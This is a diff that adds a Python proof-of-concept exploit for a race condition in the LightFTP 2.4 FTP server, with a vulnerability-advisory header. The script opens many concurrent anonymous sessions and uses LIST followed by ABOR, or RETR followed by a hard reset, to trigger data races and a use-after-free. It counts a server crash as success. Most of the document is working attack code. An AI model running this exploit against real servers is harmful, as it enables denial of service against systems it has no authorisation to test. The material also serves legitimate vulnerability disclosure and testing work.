@@ -1,0 +1,160 @@
+#!/usr/bin/env python3
+#
+#
+# LightFTP Server 2.4 Race Condition
+#
+#
+# Vendor: LightFTP Project
+# Product web page: https://github.com/hfiref0x/LightFTP
+# Affected version: 2.4 (d28c5e0)
+#
+# Summary: Small x86-32/x64 FTP Server.
+#
+# Desc: LightFTP through version 2.4 (current master, commit d28c5e0) contains
+# multiple data races in ftpserv.c caused by unsynchronized access to the shared
+# FTPCONTEXT between a connection's control thread and its data-transfer worker
+# thread. In worker_thread_cleanup(), invoked by the anonymous-reachable ABOR
+# command, the control thread reads and writes context->data_socket, context->data_ipv4,
+# and context->worker_thread_abort with no lock, while the detached worker thread
+# (list_thread and its siblings) concurrently uses the same data socket and writes
+# context->worker_thread_valid. Version 2.4 removed the MTLock mutex that previously
+# guarded this state and replaced it with an atomic busy compare-and-swap that only
+# serializes worker startup, not cleanup against a running worker, so the control
+# thread closes and clears the data connection while the worker is still operating
+# on it. ThreadSanitizer confirms data races at at least 16 distinct source locations
+# (5 in worker_thread_cleanup), reproducible by an anonymous user with LIST followed
+# by ABOR. The per-run report count is higher and scales with concurrency. The impact
+# is undefined behavior with potential denial of service; a crash on a standard release
+# build was not demonstrated.
+#
+# Tested on: Kali Linux
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6002
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6002
+# 
+# CVE ID: CVE-2026-70637
+# CVE URL: https://www.cve.org/CVERecord?id=CVE-2026-70637
+#
+#
+# 29.07.2026
+#
+
+import threading
+import argparse
+import socket
+import struct
+import time
+
+_counter_lock = threading.Lock()
+_rounds = 0
+
+def _recv(sock, timeout=2.0):
+    sock.settimeout(timeout)
+    try:
+        return sock.recv(4096).decode("latin-1", "replace")
+    except OSError:
+        return ""
+
+def _send(sock, line):
+    sock.sendall((line + "\r\n").encode())
+
+def _pasv_port(resp):
+    try:
+        a = resp[resp.find("(") + 1: resp.find(")")].split(",")
+        if len(a) != 6:
+            return None
+        return (int(a[4]) << 8) + int(a[5])
+    except (ValueError, IndexError):
+        return None
+
+def _hard_reset(sock):
+    try:
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
+                        struct.pack("ii", 1, 0))
+        sock.close()
+    except OSError:
+        pass
+
+def _one_round(args):
+    c = socket.create_connection((args.host, args.port), timeout=5)
+    _recv(c)
+    _send(c, "USER " + args.user); _recv(c)
+    _send(c, "PASS " + args.password); _recv(c)
+    _send(c, "TYPE I"); _recv(c)
+    _send(c, "PASV")
+    dport = _pasv_port(_recv(c))
+    if not dport:
+        c.close()
+        return
+    d = socket.create_connection((args.host, dport), timeout=5)
+    if args.mode == "drop":
+        _send(c, "RETR " + args.file)
+        time.sleep(args.gap)
+        _hard_reset(c)
+        try:
+            d.close()
+        except OSError:
+            pass
+    else:
+        _send(c, "LIST")
+        time.sleep(args.gap)
+        _send(c, "ABOR")
+        try:
+            d.close()
+        except OSError:
+            pass
+        _recv(c, timeout=3)
+        try:
+            _send(c, "QUIT"); c.close()
+        except OSError:
+            pass
+
+def session(args, tid):
+    global _rounds
+    for _ in range(args.iterations):
+        try:
+            _one_round(args)
+            with _counter_lock:
+                _rounds += 1
+        except OSError:
+            break
+
+def main():
+    p = argparse.ArgumentParser(description=__doc__,
+                                formatter_class=argparse.RawDescriptionHelpFormatter)
+    p.add_argument("--host", default="127.0.0.1")
+    p.add_argument("--port", type=int, default=2121)
+    p.add_argument("--user", default="anonymous")
+    p.add_argument("--password", default="x")
+    p.add_argument("--connections", type=int, default=16)
+    p.add_argument("--iterations", type=int, default=20)
+    p.add_argument("--gap", type=float, default=0.0,
+                   help="seconds to let the worker run before ABOR / RST")
+    p.add_argument("--mode", choices=["abor", "drop"], default="abor",
+                   help="abor: LIST+ABOR (data-race path). "
+                        "drop: RETR a large file then RST the control "
+                        "connection (use-after-free-of-ctx path).")
+    p.add_argument("--file", default="big.bin",
+                   help="file to RETR in drop mode (make it large, server-side)")
+    a = p.parse_args()
+
+    print("[*] mode=%s racing %s:%d with %d connections x %d iterations"
+          % (a.mode, a.host, a.port, a.connections, a.iterations))
+    threads = [threading.Thread(target=session, args=(a, i))
+               for i in range(a.connections)]
+    t0 = time.time()
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+    print("[+] completed %d rounds in %.1fs" % (_rounds, time.time() - t0))
+    print("    watch gdb for SIGSEGV/SIGABRT (drop mode targets use-after-free "
+          "of the stack ctx); a server crash is the positive result.")
+
+if __name__ == "__main__":
+    main()
